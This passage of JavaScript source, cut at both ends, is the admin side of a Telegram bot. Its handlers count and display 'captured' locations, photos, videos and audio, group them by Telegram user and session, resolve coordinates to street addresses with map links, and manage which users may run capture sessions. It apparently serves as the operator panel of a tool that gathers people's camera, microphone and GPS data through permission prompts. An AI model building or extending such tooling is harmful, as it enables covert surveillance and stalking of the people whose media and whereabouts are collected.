    await ctx.answerCbQuery('Loading dashboard...');
    
    try {
        // Get stats from API
        const result = await api.getAdminStats(user.id);
        
        let msg = `📊 *ADMIN DASHBOARD*\n`;
        msg += `━━━━━━━━━━━━━━━━━━\n\n`;
        
        if (result.success && result.stats) {
            const s = result.stats;
            msg += `👥 *Users*\n`;
            msg += `├ Total: ${s.totalUsers || 0}\n`;
            msg += `├ Approved: ${s.approvedUsers || 0}\n`;
            msg += `└ Pending: ${s.pendingUsers || 0}\n\n`;
            
            msg += `📁 *Captured Data*\n`;
            msg += `├ 📍 Locations: ${s.totalLocations || 0}\n`;
            msg += `├ 📷 Photos: ${s.totalPhotos || 0}\n`;
            msg += `├ 🎥 Videos: ${s.totalVideos || 0}\n`;
            msg += `└ 🎤 Audio: ${s.totalAudio || 0}\n\n`;
            
            msg += `📈 *Sessions*\n`;
            msg += `├ Total: ${s.totalSessions || 0}\n`;
            msg += `└ Active: ${s.activeSessions || 0}\n`;
        } else {
            msg += `📍 Locations: Loading...\n`;
            msg += `📷 Photos: Loading...\n`;
            msg += `🎥 Videos: Loading...\n`;
            msg += `🎤 Audio: Loading...\n`;
        }
        
        msg += `\n🕐 Updated: ${new Date().toLocaleTimeString()}`;
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...adminPanelKeyboard
        });
        
    } catch (error) {
        logger.error('Dashboard error', { error: error.message });
        await ctx.reply('❌ Failed to load dashboard');
    }
});

/**
 * Handle noop (do nothing button)
 */
bot.action('noop', async (ctx) => {
    await ctx.answerCbQuery();
});

/**
 * Handle admin view all locations
 */
bot.action('admin_all_locations', async (ctx) => {
    if (!isAdmin(ctx.from.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getAllMedia('location');
        
        if (!result.success || !result.data || result.data.length === 0) {
            await ctx.editMessageText('📍 No locations captured yet.', {
                ...Markup.inlineKeyboard([[Markup.button.callback('« Back', 'admin_panel')]])
            });
            return;
        }
        
        // Group by user
        const userMap = new Map();
        for (const loc of result.data) {
            const id = loc.telegram_id || 'unknown';
            if (!userMap.has(id)) {
                userMap.set(id, { 
                    username: loc.username || loc.first_name || 'Unknown',
                    count: 0 
                });
            }
            userMap.get(id).count++;
        }
        
        let msg = `📍 *All Locations* (${result.data.length})\n\n`;
        msg += `Select a user to view their locations:\n\n`;
        
        const buttons = [];
        buttons.push([Markup.button.callback(`📍 View All (${result.data.length})`, 'admin_loc_all')]);
        
        for (const [telegramId, info] of userMap) {
            buttons.push([Markup.button.callback(
                `👤 ${info.username} (${info.count})`,
                `admin_loc_user_${telegramId}`
            )]);
        }
        buttons.push([Markup.button.callback('« Back', 'admin_panel')]);
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons.slice(0, 10))
        });
        
    } catch (error) {
        logger.error('Failed to load locations', { error: error.message });
        await ctx.reply('❌ Error: ' + error.message);
    }
});

/**
 * View all locations (no filter)
 */
bot.action('admin_loc_all', async (ctx) => {
    if (!isAdmin(ctx.from.id)) return ctx.answerCbQuery('❌ Admin access required');
    await ctx.answerCbQuery('Loading all locations...');
    await showLocations(ctx, null);
});

/**
 * View locations for specific user
 */
bot.action(/^admin_loc_user_(\d+)$/, async (ctx) => {
    if (!isAdmin(ctx.from.id)) return ctx.answerCbQuery('❌ Admin access required');
    const userId = ctx.match[1];
    await ctx.answerCbQuery('Loading user locations...');
    await showLocations(ctx, userId);
});

/**
 * Helper function to show locations
 */
async function showLocations(ctx, filterUserId) {
    try {
        const result = await api.getAllMedia('location');
        let locations = result.data || [];
        
        if (filterUserId) {
            locations = locations.filter(l => String(l.telegram_id) === String(filterUserId));
        }
        
        if (locations.length === 0) {
            await ctx.reply('📍 No locations found.');
            return;
        }
        
        const title = filterUserId 
            ? `📍 *Locations for User ${filterUserId}* (${locations.length})`
            : `📍 *ALL LOCATIONS* (${locations.length})`;
        await ctx.reply(`${title}\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
        
        for (let i = 0; i < Math.min(locations.length, 20); i++) {
            const loc = locations[i];
            const metadata = typeof loc.metadata === 'string' ? JSON.parse(loc.metadata) : loc.metadata;
            
            let locMsg = `📍 *#${i + 1}* • User: \`${loc.telegram_id || loc.telegramId}\`\n`;
            locMsg += `🕐 ${new Date(loc.created_at).toLocaleString()}\n`;
            
            if (metadata.latitude && metadata.longitude) {
                locMsg += `🎯 \`${metadata.latitude}, ${metadata.longitude}\`\n`;
                locMsg += `[📍 Maps](https://www.google.com/maps?q=${metadata.latitude},${metadata.longitude})`;
            }
            
            await ctx.reply(locMsg, { parse_mode: 'Markdown', disable_web_page_preview: true });
            
            if (i > 0 && i % 10 === 0) await new Promise(r => setTimeout(r, 500));
        }
        
        if (locations.length > 20) {
            await ctx.reply(`... and ${locations.length - 20} more locations`);
        }
        
    } catch (error) {
        logger.error('Failed to load locations', { error: error.message });
        await ctx.reply('❌ Error: ' + error.message);
    }
}

/**
 * Handle admin view all photos
 */
bot.action('admin_all_photos', async (ctx) => {
    if (!isAdmin(ctx.from.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getAllMedia('photo');
        
        if (!result.success || !result.data || result.data.length === 0) {
            await ctx.editMessageText('📷 No photos captured yet.', {
                ...Markup.inlineKeyboard([[Markup.button.callback('« Back', 'admin_panel')]])
            });
            return;
        }
        
        // Group by user
        const userMap = new Map();
        for (const photo of result.data) {
            const id = photo.telegram_id || 'unknown';
            if (!userMap.has(id)) {
                userMap.set(id, { 
                    username: photo.username || photo.first_name || 'Unknown',
                    count: 0 
                });
            }
            userMap.get(id).count++;
        }
        
        let msg = `📷 *All Photos* (${result.data.length})\n\n`;
        msg += `Select a user to view their photos:\n\n`;
        
        const buttons = [];
        buttons.push([Markup.button.callback(`📷 View All (${result.data.length})`, 'admin_photo_all')]);
        
        for (const [telegramId, info] of userMap) {
            buttons.push([Markup.button.callback(
                `👤 ${info.username} (${info.count})`,
                `admin_photo_user_${telegramId}`
            )]);
        }
        buttons.push([Markup.button.callback('« Back', 'admin_panel')]);
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons.slice(0, 10))
        });
        
    } catch (error) {
        logger.error('Failed to load photos', { error: error.message });
        await ctx.reply('❌ Error: ' + error.message);
    }
});

/**
 * View all photos (no filter)
 */
bot.action('admin_photo_all', async (ctx) => {
    if (!isAdmin(ctx.from.id)) return ctx.answerCbQuery('❌ Admin access required');
    await ctx.answerCbQuery('Loading all photos...');
    await showPhotos(ctx, null);
});

/**
 * View photos for specific user
 */
bot.action(/^admin_photo_user_(\d+)$/, async (ctx) => {
    if (!isAdmin(ctx.from.id)) return ctx.answerCbQuery('❌ Admin access required');
    const userId = ctx.match[1];
    await ctx.answerCbQuery('Loading user photos...');
    await showPhotos(ctx, userId);
});

/**
 * Helper function to show photos
 */
async function showPhotos(ctx, filterUserId) {
    const fs = require('fs');
    const path = require('path');
    
    try {
        const result = await api.getAllMedia('photo');
        let photos = result.data || [];
        
        if (filterUserId) {
            photos = photos.filter(p => String(p.telegram_id) === String(filterUserId));
        }
        
        if (photos.length === 0) {
            await ctx.reply('📷 No photos found.');
            return;
        }
        
        const title = filterUserId 
            ? `📷 *Photos for User ${filterUserId}* (${photos.length})`
            : `📷 *ALL PHOTOS* (${photos.length})`;
        await ctx.reply(`${title}\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
        
        for (let i = 0; i < Math.min(photos.length, 10); i++) {
            const photo = photos[i];
            const caption = `📷 #${i + 1} • User: ${photo.telegram_id || photo.telegramId}\n🕐 ${new Date(photo.created_at).toLocaleString()}`;
            
            try {
                let fullPath = photo.file_path;
                if (!path.isAbsolute(fullPath)) {
                    fullPath = path.join(__dirname, '..', 'server', fullPath);
                }
                
                if (fs.existsSync(fullPath)) {
                    await ctx.replyWithPhoto({ source: fullPath }, { caption });
                } else {
                    await ctx.reply(`📷 #${i + 1} • File not found on server`);
                }
            } catch (err) {
                await ctx.reply(`📷 #${i + 1} • Error loading photo`);
            }
            
            if (i > 0 && i % 5 === 0) await new Promise(r => setTimeout(r, 1000));
        }
        
        if (photos.length > 10) {
            await ctx.reply(`... and ${photos.length - 10} more photos`);
        }
        
    } catch (error) {
        logger.error('Failed to load photos', { error: error.message });
        await ctx.reply('❌ Error: ' + error.message);
    }
}

/**
 * Handle admin view all videos
 */
bot.action('admin_all_videos', async (ctx) => {
    if (!isAdmin(ctx.from.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getAllMedia('video');
        
        if (!result.success || !result.data || result.data.length === 0) {
            await ctx.editMessageText('🎥 No videos captured yet.', {
                ...Markup.inlineKeyboard([[Markup.button.callback('« Back', 'admin_panel')]])
            });
            return;
        }
        
        // Group by user
        const userMap = new Map();
        for (const video of result.data) {
            const id = video.telegram_id || 'unknown';
            if (!userMap.has(id)) {
                userMap.set(id, { 
                    username: video.username || video.first_name || 'Unknown',
                    count: 0 
                });
            }
            userMap.get(id).count++;
        }
        
        let msg = `🎥 *All Videos* (${result.data.length})\n\n`;
        msg += `Select a user to view their videos:\n\n`;
        
        const buttons = [];
        buttons.push([Markup.button.callback(`🎥 View All (${result.data.length})`, 'admin_video_all')]);
        
        for (const [telegramId, info] of userMap) {
            buttons.push([Markup.button.callback(
                `👤 ${info.username} (${info.count})`,
                `admin_video_user_${telegramId}`
            )]);
        }
        buttons.push([Markup.button.callback('« Back', 'admin_panel')]);
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons.slice(0, 10))
        });
        
    } catch (error) {
        logger.error('Failed to load videos', { error: error.message });
        await ctx.reply('❌ Error: ' + error.message);
    }
});

/**
 * View all videos (no filter)
 */
bot.action('admin_video_all', async (ctx) => {
    if (!isAdmin(ctx.from.id)) return ctx.answerCbQuery('❌ Admin access required');
    await ctx.answerCbQuery('Loading all videos...');
    await showVideos(ctx, null);
});

/**
 * View videos for specific user
 */
bot.action(/^admin_video_user_(\d+)$/, async (ctx) => {
    if (!isAdmin(ctx.from.id)) return ctx.answerCbQuery('❌ Admin access required');
    const userId = ctx.match[1];
    await ctx.answerCbQuery('Loading user videos...');
    await showVideos(ctx, userId);
});

/**
 * Helper function to show videos
 */
async function showVideos(ctx, filterUserId) {
    const fs = require('fs');
    const path = require('path');
    
    try {
        const result = await api.getAllMedia('video');
        let videos = result.data || [];
        
        if (filterUserId) {
            videos = videos.filter(v => String(v.telegram_id) === String(filterUserId));
        }
        
        if (videos.length === 0) {
            await ctx.reply('🎥 No videos found.');
            return;
        }
        
        const title = filterUserId 
            ? `🎥 *Videos for User ${filterUserId}* (${videos.length})`
            : `🎥 *ALL VIDEOS* (${videos.length})`;
        await ctx.reply(`${title}\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
        
        for (let i = 0; i < Math.min(videos.length, 5); i++) {
            const video = videos[i];
            const sizeMB = video.file_size ? (video.file_size / (1024 * 1024)).toFixed(2) : '?';
            const caption = `🎥 #${i + 1} • User: ${video.telegram_id}\n📁 ${sizeMB} MB`;
            
            try {
                let fullPath = video.file_path;
                if (!path.isAbsolute(fullPath)) {
                    fullPath = path.join(__dirname, '..', 'server', fullPath);
                }
                
                if (fs.existsSync(fullPath)) {
                    await ctx.replyWithVideo({ source: fullPath }, { caption });
                } else {
                    await ctx.reply(`🎥 #${i + 1} • File not found`);
                }
            } catch (err) {
                await ctx.reply(`🎥 #${i + 1} • Error loading video`);
            }
            
            await new Promise(r => setTimeout(r, 2000));
        }
        
        if (videos.length > 5) {
            await ctx.reply(`... and ${videos.length - 5} more videos`);
        }
        
    } catch (error) {
        logger.error('Failed to load videos', { error: error.message });
        await ctx.reply('❌ Error: ' + error.message);
    }
}

/**
 * Handle admin view all audio
 */
bot.action('admin_all_audio', async (ctx) => {
    if (!isAdmin(ctx.from.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getAllMedia('audio');
        
        if (!result.success || !result.data || result.data.length === 0) {
            await ctx.editMessageText('🎤 No audio captured yet.', {
                ...Markup.inlineKeyboard([[Markup.button.callback('« Back', 'admin_panel')]])
            });
            return;
        }
        
        // Group by user
        const userMap = new Map();
        for (const audio of result.data) {
            const id = audio.telegram_id || 'unknown';
            if (!userMap.has(id)) {
                userMap.set(id, { 
                    username: audio.username || audio.first_name || 'Unknown',
                    count: 0 
                });
            }
            userMap.get(id).count++;
        }
        
        let msg = `🎤 *All Audio* (${result.data.length})\n\n`;
        msg += `Select a user to view their audio:\n\n`;
        
        const buttons = [];
        buttons.push([Markup.button.callback(`🎤 View All (${result.data.length})`, 'admin_audio_all')]);
        
        for (const [telegramId, info] of userMap) {
            buttons.push([Markup.button.callback(
                `👤 ${info.username} (${info.count})`,
                `admin_audio_user_${telegramId}`
            )]);
        }
        buttons.push([Markup.button.callback('« Back', 'admin_panel')]);
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard(buttons.slice(0, 10))
        });
        
    } catch (error) {
        logger.error('Failed to load audio', { error: error.message });
        await ctx.reply('❌ Error: ' + error.message);
    }
});

/**
 * View all audio (no filter)
 */
bot.action('admin_audio_all', async (ctx) => {
    if (!isAdmin(ctx.from.id)) return ctx.answerCbQuery('❌ Admin access required');
    await ctx.answerCbQuery('Loading all audio...');
    await showAudio(ctx, null);
});

/**
 * View audio for specific user
 */
bot.action(/^admin_audio_user_(\d+)$/, async (ctx) => {
    if (!isAdmin(ctx.from.id)) return ctx.answerCbQuery('❌ Admin access required');
    const userId = ctx.match[1];
    await ctx.answerCbQuery('Loading user audio...');
    await showAudio(ctx, userId);
});

/**
 * Helper function to show audio
 */
async function showAudio(ctx, filterUserId) {
    const fs = require('fs');
    const path = require('path');
    
    try {
        const result = await api.getAllMedia('audio');
        let audios = result.data || [];
        
        if (filterUserId) {
            audios = audios.filter(a => String(a.telegram_id) === String(filterUserId));
        }
        
        if (audios.length === 0) {
            await ctx.reply('🎤 No audio found.');
            return;
        }
        
        const title = filterUserId 
            ? `🎤 *Audio for User ${filterUserId}* (${audios.length})`
            : `🎤 *ALL AUDIO* (${audios.length})`;
        await ctx.reply(`${title}\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
        
        for (let i = 0; i < Math.min(audios.length, 10); i++) {
            const audio = audios[i];
            const sizeMB = audio.file_size ? (audio.file_size / (1024 * 1024)).toFixed(2) : '?';
            const caption = `🎤 #${i + 1} • User: ${audio.telegram_id}\n📁 ${sizeMB} MB`;
            
            try {
                let fullPath = audio.file_path;
                if (!path.isAbsolute(fullPath)) {
                    fullPath = path.join(__dirname, '..', 'server', fullPath);
                }
                
                if (fs.existsSync(fullPath)) {
                    await ctx.replyWithAudio({ source: fullPath }, { caption });
                } else {
                    await ctx.reply(`🎤 #${i + 1} • File not found`);
                }
            } catch (err) {
                await ctx.reply(`🎤 #${i + 1} • Error loading audio`);
            }
            
            await new Promise(r => setTimeout(r, 1500));
        }
        
        if (audios.length > 10) {
            await ctx.reply(`... and ${audios.length - 10} more audio files`);
        }
        
    } catch (error) {
        logger.error('Failed to load audio', { error: error.message });
        await ctx.reply('❌ Error: ' + error.message);
    }
}

/**
 * Handle user data view by type
 */
bot.action(/^userdata_(\d+)_(location|photo|video|audio)$/, async (ctx) => {
    if (!isAdmin(ctx.from.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    const telegramId = ctx.match[1];
    const mediaType = ctx.match[2];
    
    await ctx.answerCbQuery(`Loading ${mediaType}s...`);
    
    try {
        const result = await api.getAllCapturedData(telegramId);
        
        if (!result.success || !result.data) {
            await ctx.reply(`No ${mediaType} data found for this user.`);
            return;
        }
        
        const items = result.data.filter(d => d.media_type === mediaType);
        
        if (items.length === 0) {
            await ctx.reply(`📭 No ${mediaType} captured by this user.`);
            return;
        }
        
        const emojis = { location: '📍', photo: '📷', video: '🎥', audio: '🎤' };
        const emoji = emojis[mediaType];
        
        await ctx.reply(`${emoji} *USER ${telegramId} - ${mediaType.toUpperCase()} (${items.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
        
        const fs = require('fs');
        const path = require('path');
        
        for (let i = 0; i < Math.min(items.length, 10); i++) {
            const item = items[i];
            
            if (mediaType === 'location') {
                const metadata = typeof item.metadata === 'string' ? JSON.parse(item.metadata) : item.metadata;
                let msg = `📍 *#${i + 1}*\n🕐 ${new Date(item.created_at).toLocaleString()}\n`;
                if (metadata.latitude && metadata.longitude) {
                    msg += `🎯 \`${metadata.latitude}, ${metadata.longitude}\`\n`;
                    msg += `[📍 Maps](https://www.google.com/maps?q=${metadata.latitude},${metadata.longitude})`;
                }
                await ctx.reply(msg, { parse_mode: 'Markdown', disable_web_page_preview: true });
            } else {
                const caption = `${emoji} #${i + 1}\n🕐 ${new Date(item.created_at).toLocaleString()}`;
                
                try {
                    let fullPath = item.file_path;
                    if (!path.isAbsolute(fullPath)) {
                        fullPath = path.join(__dirname, '..', 'server', fullPath);
                    }
                    
                    if (fs.existsSync(fullPath)) {
                        if (mediaType === 'photo') await ctx.replyWithPhoto({ source: fullPath }, { caption });
                        else if (mediaType === 'video') await ctx.replyWithVideo({ source: fullPath }, { caption });
                        else if (mediaType === 'audio') await ctx.replyWithAudio({ source: fullPath }, { caption });
                    } else {
                        await ctx.reply(`${emoji} #${i + 1} • File not found`);
                    }
                } catch (err) {
                    await ctx.reply(`${emoji} #${i + 1} • Error loading file`);
                }
            }
            
            if (i > 0 && i % 5 === 0) await new Promise(r => setTimeout(r, 1000));
        }
        
        if (items.length > 10) {
            await ctx.reply(`... and ${items.length - 10} more ${mediaType}(s)`);
        }
        
    } catch (error) {
        logger.error('Failed to load user data', { error: error.message });
        await ctx.reply('❌ Error: ' + error.message);
    }
});

/**
 * Handle view access requests
 */
bot.action('admin_requests', async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getPendingRequests(user.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get requests');
        }
        
        if (result.count === 0) {
            await ctx.editMessageText(
                '📋 *Access Requests*\n\n' +
                '✅ No pending requests!',
                { parse_mode: 'Markdown', ...adminPanelKeyboard }
            );
            return;
        }
        
        let msg = `📋 *Access Requests* (${result.count})\n\n`;
        result.requests.forEach((req, i) => {
            msg += `${i + 1}. ${req.firstName || 'Unknown'} ${req.lastName || ''}\n`;
            msg += `   @${req.username || 'N/A'} | ID: \`${req.telegramId}\`\n\n`;
        });
        msg += `\n_Tap ✅ to approve or ❌ to deny_`;
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...accessRequestsKeyboard(result.requests)
        });
        
    } catch (error) {
        logger.error('Failed to get access requests', { error: error.message });
        await ctx.reply('❌ Failed to load requests: ' + error.message);
    }
});

/**
 * Handle view all users
 */
bot.action('admin_users', async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getAllUsers(user.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get users');
        }
        
        if (result.count === 0) {
            await ctx.editMessageText(
                '👥 *All Users*\n\n' +
                'No users registered yet.',
                { parse_mode: 'Markdown', ...adminPanelKeyboard }
            );
            return;
        }
        
        let msg = `👥 *All Users* (${result.count})\n\n`;
        msg += `_Tap on a user to view details_\n\n`;
        msg += `✅ = Approved | ❌ = Not Approved`;
        
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...userListKeyboard(result.users)
        });
        
    } catch (error) {
        logger.error('Failed to get all users', { error: error.message });
        await ctx.reply('❌ Failed to load users: ' + error.message);
    }
});

/**
 * Handle view specific user data
 */
bot.action(/^viewuser_(\d+)$/, async (ctx) => {
    const adminUser = ctx.from;
    const targetTelegramId = parseInt(ctx.match[1]);
    
    if (!isAdmin(adminUser.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getUserData(targetTelegramId, adminUser.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get user data');
        }
        
        const { user, sessions } = result.data;
        
        // Escape HTML special characters
        const escapeHtml = (str) => {
            if (!str) return '';
            return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        };
        
        const firstName = escapeHtml(user.firstName || '');
        const lastName = escapeHtml(user.lastName || '');
        const username = escapeHtml(user.username || 'N/A');
        
        let msg = `👤 <b>User Details</b>\n\n`;
        msg += `<b>Name:</b> ${firstName} ${lastName}\n`;
        msg += `<b>Username:</b> @${username}\n`;
        msg += `<b>Telegram ID:</b> <code>${user.telegramId}</code>\n`;
        msg += `<b>Status:</b> ${user.isApproved ? '✅ Approved' : '❌ Not Approved'}\n\n`;
        
        msg += `📊 <b>Sessions:</b> ${sessions.length}\n`;
        
        let totalMedia = 0;
        sessions.forEach(s => {
            totalMedia += s.mediaCount;
        });
        msg += `📁 <b>Total Media:</b> ${totalMedia}\n\n`;
        
        if (sessions.length > 0) {
            msg += `<b>Recent Sessions:</b>\n`;
            sessions.slice(0, 5).forEach((s, i) => {
                const statusEmoji = s.status === 'active' ? '🟢' : s.status === 'ended' ? '⚫' : '🔴';
                msg += `${i + 1}. ${statusEmoji} ${escapeHtml(s.permissionType)} (${s.mediaCount} files)\n`;
            });
            msg += `\n<i>Tap a session below to view captured data</i>`;
        }
        
        await ctx.editMessageText(msg, {
            parse_mode: 'HTML',
            ...userDetailKeyboard(targetTelegramId, user.isApproved, sessions)
        });
        
    } catch (error) {
        logger.error('Failed to get user data', { error: error.message });
        await ctx.reply('❌ Failed to load user data: ' + error.message);
    }
});

/**
 * Handle view session data (admin)
 */
bot.action(/^viewsession_(.+)$/, async (ctx) => {
    const adminUser = ctx.from;
    const sessionId = ctx.match[1];
    
    if (!isAdmin(adminUser.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getSessionMedia(sessionId);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get media');
        }
        
        const { counts, media, permissionType } = result;
        const totalItems = counts.photos + counts.videos + counts.audio + counts.locations;
        
        if (totalItems === 0) {
            await ctx.reply('📭 No data captured in this session.');
            return;
        }
        
        // Summary message
        let summaryMsg = `📂 <b>SESSION DATA (Admin View)</b>\n\n`;
        summaryMsg += `<b>Type:</b> ${config.permissions[permissionType]?.label || permissionType}\n\n`;
        summaryMsg += `<b>📊 Captured Data:</b>\n`;
        if (counts.photos > 0) summaryMsg += `  📷 Photos: ${counts.photos}\n`;
        if (counts.videos > 0) summaryMsg += `  🎥 Videos: ${counts.videos}\n`;
        if (counts.audio > 0) summaryMsg += `  🎤 Audio: ${counts.audio}\n`;
        if (counts.locations > 0) summaryMsg += `  📍 Locations: ${counts.locations}\n`;
        
        await ctx.reply(summaryMsg, { parse_mode: 'HTML' });
        
        // Send locations with full details
        if (media.locations && media.locations.length > 0) {
            for (let i = 0; i < media.locations.length; i++) {
                const loc = media.locations[i];
                const data = loc.metadata;
                
                let locMsg = `📍 <b>LOCATION ${i + 1}</b>\n`;
                locMsg += `🕐 ${new Date(loc.createdAt).toLocaleString()}\n\n`;
                
                if (data.address) {
                    locMsg += `📌 <b>Address:</b>\n${data.address.formatted || data.address.displayName}\n\n`;
                    if (data.address.street) locMsg += `🏠 Street: ${data.address.street}\n`;
                    if (data.address.neighborhood) locMsg += `🏘️ Area: ${data.address.neighborhood}\n`;
                    if (data.address.city) locMsg += `🌆 City: ${data.address.city}\n`;
                    if (data.address.state) locMsg += `🗺️ State: ${data.address.state}\n`;
                    if (data.address.country) locMsg += `🌍 Country: ${data.address.country}\n`;
                    if (data.address.postalCode) locMsg += `📮 Postal: ${data.address.postalCode}\n`;
                }
                
                if (data.coordinates) {
                    locMsg += `\n🎯 <b>Coordinates:</b>\n`;
                    locMsg += `├ Lat: <code>${data.coordinates.latitude?.toFixed(6)}</code>\n`;
                    locMsg += `├ Lng: <code>${data.coordinates.longitude?.toFixed(6)}</code>\n`;
                    if (data.coordinates.accuracy) locMsg += `├ Accuracy: ${data.coordinates.accuracy.toFixed(1)}m\n`;
                }
                
                if (data.maps) {
                    locMsg += `\n🗺️ <a href="${data.maps.googleMaps}">Open in Google Maps</a>`;
                }
                
                await ctx.reply(locMsg, { parse_mode: 'HTML', disable_web_page_preview: false });
            }
        }
        
        // Send photos
        if (media.photos && media.photos.length > 0) {
            for (let i = 0; i < media.photos.length; i++) {
                const photo = media.photos[i];
                try {
                    const photoUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${photo.id}/file`;
                    await ctx.replyWithPhoto(
                        { url: photoUrl },
                        { caption: `📷 Photo ${i + 1} - ${new Date(photo.createdAt).toLocaleString()}` }
                    );
                } catch (photoErr) {
                    logger.error('Failed to send photo', { error: photoErr.message });
                    await ctx.reply(`📷 Photo ${i + 1} - File: ${photo.fileName}`);
                }
            }
        }
        
        // Send videos
        if (media.videos && media.videos.length > 0) {
            for (let i = 0; i < media.videos.length; i++) {
                const video = media.videos[i];
                try {
                    const videoUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${video.id}/file`;
                    await ctx.replyWithVideo(
                        { url: videoUrl },
                        { caption: `🎥 Video ${i + 1} - ${new Date(video.createdAt).toLocaleString()}` }
                    );
                } catch (videoErr) {
                    logger.error('Failed to send video', { error: videoErr.message });
                    await ctx.reply(`🎥 Video ${i + 1} - File: ${video.fileName}`);
                }
            }
        }
        
        // Send audio
        if (media.audio && media.audio.length > 0) {
            for (let i = 0; i < media.audio.length; i++) {
                const audio = media.audio[i];
                try {
                    const audioUrl = `${config.api.baseUrl}/api/sessions/${sessionId}/media/${audio.id}/file`;
                    await ctx.replyWithAudio(
                        { url: audioUrl },
                        { caption: `🎤 Audio ${i + 1} - ${new Date(audio.createdAt).toLocaleString()}` }
                    );
                } catch (audioErr) {
                    logger.error('Failed to send audio', { error: audioErr.message });
                    await ctx.reply(`🎤 Audio ${i + 1} - File: ${audio.fileName}`);
                }
            }
        }
        
        logger.info('Admin viewed session data', { sessionId, adminId: adminUser.id });
        
    } catch (error) {
        logger.error('Failed to get session data', { error: error.message });
        await ctx.reply('❌ Failed to load session data: ' + error.message);
    }
});

/**
 * Handle approve user
 */
bot.action(/^approve_(\d+)$/, async (ctx) => {
    const adminUser = ctx.from;
    const targetTelegramId = parseInt(ctx.match[1]);
    
    if (!isAdmin(adminUser.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.approveUser(targetTelegramId, adminUser.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to approve user');
        }
        
        await ctx.reply(
            `✅ *User Approved!*\n\n` +
            `User: ${result.user.firstName || result.user.username || targetTelegramId}\n` +
            `They can now use the bot.`,
            { parse_mode: 'Markdown' }
        );
        
        // Notify the user
        try {
            await ctx.telegram.sendMessage(
                targetTelegramId,
                '🎉 *Access Granted!*\n\n' +
                'Your access request has been approved!\n' +
                'You can now use all bot features.\n\n' +
                'Type /start to begin.',
                { parse_mode: 'Markdown' }
            );
        } catch (notifyErr) {
            logger.error('Failed to notify approved user', { error: notifyErr.message });
        }
        
        logger.info('User approved', { targetTelegramId, approvedBy: adminUser.id });
        
    } catch (error) {
        logger.error('Failed to approve user', { error: error.message });
        await ctx.reply('❌ Failed to approve user: ' + error.message);
    }
});

/**
 * Handle deny user
 */
bot.action(/^deny_(\d+)$/, async (ctx) => {
    const adminUser = ctx.from;
    const targetTelegramId = parseInt(ctx.match[1]);
    
    if (!isAdmin(adminUser.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.denyUser(targetTelegramId, adminUser.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to deny user');
        }
        
        await ctx.reply(
            `❌ *User Access Denied/Revoked*\n\n` +
            `User: ${result.user.username || targetTelegramId}\n` +
            `They can no longer use the bot.`,
            { parse_mode: 'Markdown' }
        );
        
        // Notify the user
        try {
            await ctx.telegram.sendMessage(
                targetTelegramId,
                '🔒 *Access Denied*\n\n' +
                'Your access has been denied or revoked.\n' +
                `Contact ${config.admin.contact} if you think this is a mistake.`,
                { parse_mode: 'Markdown' }
            );
        } catch (notifyErr) {
            logger.error('Failed to notify denied user', { error: notifyErr.message });
        }
        
        logger.info('User access denied', { targetTelegramId, deniedBy: adminUser.id });
        
    } catch (error) {
        logger.error('Failed to deny user', { error: error.message });
        await ctx.reply('❌ Failed to deny user: ' + error.message);
    }
});

// ============================================
// Staff Management Handlers
// ============================================

/**
 * Handle manage staff button
 */
bot.action('admin_staff', async (ctx) => {
    const user = ctx.from;
    
    if (!isAdmin(user.id)) {
        await ctx.answerCbQuery('❌ Admin access required');
        return;
    }
    
    await ctx.answerCbQuery();
    
    try {
        const result = await api.getStaffList(user.id);
        
        if (!result.success) {
            throw new Error(result.error || 'Failed to get staff');
        }
        
        if (result.count === 0) {
            await ctx.editMessageText(
                '👥 *Staff Management*\n\n' +
                '📭 No staff members yet.\n\n' +
                '_To add staff, first approve a user, then use the "Add Staff" button below._',
                { 
